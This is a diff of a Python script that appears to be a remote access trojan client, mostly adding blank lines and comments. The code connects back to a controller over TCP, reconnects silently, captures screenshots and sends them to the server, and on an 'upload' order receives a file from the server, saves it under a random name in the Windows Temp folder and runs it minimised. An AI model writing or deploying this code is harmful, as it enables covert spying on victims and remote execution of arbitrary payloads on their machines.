@@ -7,7 +7,6 @@ try:
 except:
 	exit()
 
-
 def Create(): # Create Tcp Socket
     global Ip
     global Port
@@ -24,7 +23,6 @@ def Create(): # Create Tcp Socket
         time.sleep(3)
         Create()
 
-
 def Connect(): # Connect To Socket
 
     try:
@@ -35,17 +33,21 @@ def Connect(): # Connect To Socket
     	time.sleep(3)
     	Connect()
 
-
 def ExecuteOrders():
 
     while True:
 
         try: # Check If Server is online
+
             Data = S.recv(1024)
+
             Data = Data.decode("utf-8")
 
+
         except: # Reconnect
+
             Main()
+
             continue
             
         if(Data == 'screen'): 
@@ -65,7 +67,9 @@ def ExecuteOrders():
                 Snapshot.save(Path)
 
                 with open(Path, "rb") as F:
+
                     Data = F.read() # Read File Bytes
+
                     S.sendall(Data) # Send the Screenshot
 
                 F.close() # Close The File
@@ -77,24 +81,42 @@ def ExecuteOrders():
 
 
         elif(Data == 'upload'):
+
             try:
+
             	S.send(str.encode("file"))
+
             	Ex = S.recv(1024)
-            	Ex = Ex.decode("utf-8")
+
+            	Ex = Ex.decode("utf-8") # File Extension
+
             	Temp = os.getenv('Temp') # Get Temp Path
+
             	Random = string.ascii_uppercase + string.digits # Random String Settings
+
             	Random = ''.join(random.sample(Random*6, 6)) # Random String
+
             	F = open(Temp+"/"+Random+"."+Ex, "wb")
+
             	while True:
+
                     Data = S.recv(1024) # Receive File Bytes
+
                     F.write(Data)
+
                     Check = len(Data)
+
                     print(Check)
+
                     if(1024 != Check): # If 1024 > length (Data) , Stop Loop
+
                         F.close() # Close File
-                        os.system('start /min '+Temp+"/"+Random+"."+Ex)
+
+                        os.system('start /min '+Temp+"/"+Random+"."+Ex) # Execute File
+
                         break
             except:
+
             	continue
 
 
